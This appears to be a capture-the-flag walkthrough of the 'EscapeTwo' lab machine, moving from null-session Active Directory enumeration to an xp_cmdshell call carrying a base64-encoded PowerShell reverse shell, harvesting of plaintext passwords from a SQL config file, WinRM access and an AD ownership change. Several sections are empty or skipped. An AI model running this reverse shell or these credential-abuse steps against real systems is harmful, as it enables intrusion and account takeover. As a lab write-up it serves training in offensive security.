# EscapeTwo

## Nmap


## Active Directory (Null Session)

The idea it's to get all information available using a `null` session.

Try the enumerate share file with a null session with `netexec` (ex `crackmapexec`)
```
netexec smb 10.10.11.51 --shares
```

We don't have permission, but we know that we are facing a `Windows 10` server
```
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Let's try with other tool, this time it will be `smbmap`
```
smbmap -H 10.10.11.51
```
or 
```
smbmap -H 10.10.11.51 -u 'null'
```
> With a null session 

The output is the following 
```
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.10.11.51, no fun for you...
[*] Closed 1 connections
```
> We don't have permissions

Let's try this time with `smbclient`
```
smbclient -L 10.10.11.52 -N
```

Nothing again
```
do_connect: Connection to 10.10.11.52 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

We are going to check for vulnerabilities in all ports.

Let's start by `DNS`, so the `53`th port with `dig`
```
dig @10.10.11.51 sequel.htb ns
```
> `ns` : Services

We got this output
```
...
; ANSWER SECTION:
sequel.htb.		3600	IN	NS	dc01.sequel.htb.
...
```
> This is not very conclusive, we can add the `dc01.sequel.htb` to our `/etc/hosts`

Let's try for messaging Services
```
dig @10.10.11.51 sequel.htb mx
```

Again, nothing conclusive
```
...
;; AUTHORITY SECTION:
sequel.htb.		3600	IN	SOA	dc01.sequel.htb. hostmaster.sequel.htb. 130 900 600 86400 3600
...
```
> The `hostmaster.XX.XX` subdomains is by default, so we can ignore it

Finally, let's try a transfer attack
```
dig @10.10.11.51 sequel.htb axfr
```

Sadly, no this time 
```
; <<>> DiG 9.20.5 <<>> @10.10.11.51 sequel.htb axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Let's check the `RPC` service, so the `135`th port 
```
rpcclient -U "" 10.10.11.51 -N
```
> Here we try with a null session.

We got a shell
```
rpcclient $> 
```

Let's check if we can enumerate other users
```
rpcclient $> enumdomusers
```

With the null session is not possible.
```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

Given that we have credentials, let's try
```
rpcclient -U rosa%KxEPkKe6R8su 10.10.11.51
```

Seems that this password is incorrect for the `RPC` service
```
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

Now, let's look for the `LDAP` port. The port number `389`.
```
ldapsearch -x -H ldap://10.10.11.51 -s base namingcontexts
```

Nothing interessting by Now
```
#
dn:
namingcontexts: DC=sequel,DC=htb
namingcontexts: CN=Configuration,DC=sequel,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingcontexts: DC=DomainDnsZones,DC=sequel,DC=htb
namingcontexts: DC=ForestDnsZones,DC=sequel,DC=htb
```

## Active directory (Using credentials)




```
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAzADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```


```
PS C:\Windows\system32>
```

First, let's check who we are 
```
PS C:\Windows\system32> whoami
```

We are `sql_svc` user 
```
sequel\sql_svc
```

Let's change directory to the root directory
```
cd ../..
```


```
    Directory: C:\


Mode                LastWriteTime         Length Name                                                   
----                -------------         ------ ----                                                   
d-----        11/5/2022  12:03 PM                PerfLogs                                               
d-r---         1/4/2025   7:11 AM                Program Files                                          
d-----         6/9/2024   8:37 AM                Program Files (x86)                                    
d-----         6/8/2024   3:07 PM                SQL2019                                                
d-r---         6/9/2024   6:42 AM                Users                                                  
d-----         1/4/2025   8:10 AM                Windows                                        
```


Let's look for the `Users` directory.
```
PS C:\> cd Users
PS C:\Users> ls
```

We can see there's a user called `ryan`
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                   
----                -------------         ------ ----                                                   
d-----       12/25/2024   3:10 AM                Administrator                                          
d-r---         6/9/2024   4:11 AM                Public                                                 
d-----         6/9/2024   4:15 AM                ryan                                                   
d-----         6/8/2024   4:16 PM                sql_svc
```
> Seems to be empty all directories... or maybe we don't have access !


Let's check the `SQL2019` directory
```
PS C:\> cd SQL2019
```

We can find the `sql-Configuration.INI` , we can notice other passwords
```
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
```
> Extract the `WqSZAF6CysDQbGb3` password !

Given that we are as `sql_svc`, we can try this password with `ryan` user we saw before
```
netexec smb 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

We have the Ryan's credentials 
```
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
```

Given that the `5985/tcp` is open, we can check if we can use `evil-winrm`
```
netexec winrm  10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

And yes ! Ryan is part of remote control group
```
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

Let's connect to the machine with `evil-winrm`
```
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

We got a powershell !
```
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Let's check this time if we can see list anything with the ryan credentials
```
Evil-WinRM* PS C:\Users\ryan\Desktop> ls
```

we found the `user` flag !
```
    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/18/2025   8:02 PM             34 user.txt
```

Read the `[user.txt](./user.txt)` flag ! 
```
49f364d6b174ba07938144c82016d8b5
```

So now 

## Root 

Let's start by enumerating our privileges
```
*Evil-WinRM* PS C:\> whoami /priv
```

Nothing special we can use 
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Le's check all information about `ryan`
```
*Evil-WinRM* PS C:\> whoami /all
```

```
USER INFORMATION
----------------

User Name   SID
=========== ============================================
sequel\ryan S-1-5-21-548670397-972687484-3496335370-1114


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SEQUEL\Management Department                Group            S-1-5-21-548670397-972687484-3496335370-1602 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


```
*Evil-WinRM* PS C:\Windows\Temp\privesc> Import-Module .\SharpHound.ps1
```

```
*Evil-WinRM* PS C:\Windows\Temp\privesc> Invoke-BloodHound -CollectionMethods All
```

Let's change the owner

```
python3 owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```
